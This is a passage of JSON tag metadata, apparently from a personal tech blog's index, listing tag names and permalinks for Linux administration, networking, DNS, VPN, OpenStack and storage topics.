%89%B2/"},{"name":"双线","slug":"双线","permalink":"https://garywu520.github.io/tags/%E5%8F%8C%E7%BA%BF/"},{"name":"OA","slug":"OA","permalink":"https://garywu520.github.io/tags/OA/"},{"name":"PB","slug":"PB","permalink":"https://garywu520.github.io/tags/PB/"},{"name":"xargs","slug":"xargs","permalink":"https://garywu520.github.io/tags/xargs/"},{"name":"APNIC","slug":"APNIC","permalink":"https://garywu520.github.io/tags/APNIC/"},{"name":"L2TP/PPTP/OVPN","slug":"L2TP-PPTP-OVPN","permalink":"https://garywu520.github.io/tags/L2TP-PPTP-OVPN/"},{"name":"递归DNS服务器","slug":"递归DNS服务器","permalink":"https://garywu520.github.io/tags/%E9%80%92%E5%BD%92DNS%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"name":"DNScrypts","slug":"DNScrypts","permalink":"https://garywu520.github.io/tags/DNScrypts/"},{"name":"生活","slug":"生活","permalink":"https://garywu520.github.io/tags/%E7%94%9F%E6%B4%BB/"},{"name":"GitHub","slug":"GitHub","permalink":"https://garywu520.github.io/tags/GitHub/"},{"name":"zerotier","slug":"zerotier","permalink":"https://garywu520.github.io/tags/zerotier/"},{"name":"内网穿透","slug":"内网穿透","permalink":"https://garywu520.github.io/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"},{"name":"全球畅联","slug":"全球畅联","permalink":"https://garywu520.github.io/tags/%E5%85%A8%E7%90%83%E7%95%85%E8%81%94/"},{"name":"编译内核","slug":"编译内核","permalink":"https://garywu520.github.io/tags/%E7%BC%96%E8%AF%91%E5%86%85%E6%A0%B8/"},{"name":"NFS","slug":"NFS","permalink":"https://garywu520.github.io/tags/NFS/"},{"name":"jq","slug":"jq","permalink":"https://garywu520.github.io/tags/jq/"},{"name":"筛选大于某个值的数据到文件","slug":"筛选大于某个值的数据到文件","permalink":"https://garywu520.github.io/tags/%E7%AD%9B%E9%80%89%E5%A4%A7%E4%BA%8E%E6%9F%90%E4%B8%AA%E5%80%BC%E7%9A%84%E6%95%B0%E6%8D%AE%E5%88%B0%E6%96%87%E4%BB%B6/"},{"name":"DTK","slug":"DTK","permalink":"https://garywu520.github.io/tags/DTK/"},{"name":"BIOS","slug":"BIOS","permalink":"https://garywu520.github.io/tags/BIOS/"},{"name":"邮件告警","slug":"邮件告警","permalink":"https://garywu520.github.io/tags/%E9%82%AE%E4%BB%B6%E5%91%8A%E8%AD%A6/"},{"name":"短信告警","slug":"短信告警","permalink":"https://garywu520.github.io/tags/%E7%9F%AD%E4%BF%A1%E5%91%8A%E8%AD%A6/"},{"name":"将Bites转换为Mbits","slug":"将Bites转换为Mbits","permalink":"https://garywu520.github.io/tags/%E5%B0%86Bites%E8%BD%AC%E6%8D%A2%E4%B8%BAMbits/"},{"name":"raidcfg","slug":"raidcfg","permalink":"https://garywu520.github.io/tags/raidcfg/"},{"name":"dingo","slug":"dingo","permalink":"https://garywu520.github.io/tags/dingo/"},{"name":"Google DNS","slug":"Google-DNS","permalink":"https://garywu520.github.io/tags/Google-DNS/"},{"name":"计算节点","slug":"计算节点","permalink":"https://garywu520.github.io/tags/%E8%AE%A1%E7%AE%97%E8%8A%82%E7%82%B9/"},{"name":"nova_schedule调度","slug":"nova-schedule调度","permalink":"https://garywu520.github.io/tags/nova-schedule%E8%B0%83%E5%BA%A6/"},{"name":"nova_schedule","slug":"nova-schedule","permalink":"https://garywu520.github.io/tags/nova-schedule/"},{"name":"热迁移调度","slug":"热迁移调度","permalink":"https://garywu520.github.io/tags/%E7%83%AD%E8%BF%81%E7%A7%BB%E8%B0%83%E5%BA%A6/"},{"name":"光盘","slug":"光盘","permalink":"https://garywu520.github.io/tags/%E5%85%89%E7%9B%98/"},{"name":"本地Yum","slug":"本地Yum","permalink":"https://garywu520.github.io/tags/%E6%9C%AC%E5%9C%B0Yum/"},{"name":"compute","slug":"compute","permalink":"https://garywu520.github.io/tags/compute/"},{"name":"VM迁移","slug":"VM迁移","permalink":"https://garywu520.github.io/tags/VM%E8%BF%81%E7%A7%BB/"},{"name":"openstack keepalived","slug":"openstack-keepalived","permalink":"https://garywu520.github.io/tags/openstack-keepalived/"},{"name":"allow address pairs地址对","slug":"allow-address-pairs地址对","permalink":"https://garywu520.github.io/tags/allow-address-pairs%E5%9C%B0%E5%9D%80%E5%AF%B9/"},{"name":"neutron 高可用","slug":"neutron-高可用","permalink":"https://garywu520.github.io/tags/neutron-%E9%AB%98%E5%8F%AF%E7%94%A8/"},{"name":"虚拟机启用VIP","slug":"虚拟机启用VIP","permalink":"https://garywu520.github.io/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%90%AF%E7%94%A8VIP/"},{"name":"allow_address_pairs实现虚拟机高可用","slug":"allow-address-pairs实现虚拟机高可用","permalink":"https://garywu520.github.io/tags/allow-address-pairs%E5%AE%9E%E7%8E%B0%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%AB%98%E5%8F%AF%E7%94%A8/"},{"name":"BeansDB","slug":"BeansDB","permalink":"https://garywu520.github.io/tags/BeansDB/"},{"name":"Key/Value","slug":"Key-Value","permalink":"https://garywu520.github.io/tags/Key-Value/"},{"name":"图片存储","slug":"图片存储","permalink":"https://garywu520.github.io/tags/%E5%9B%BE%E7%89%87%E5%AD%98%E5%82%A8/"}]}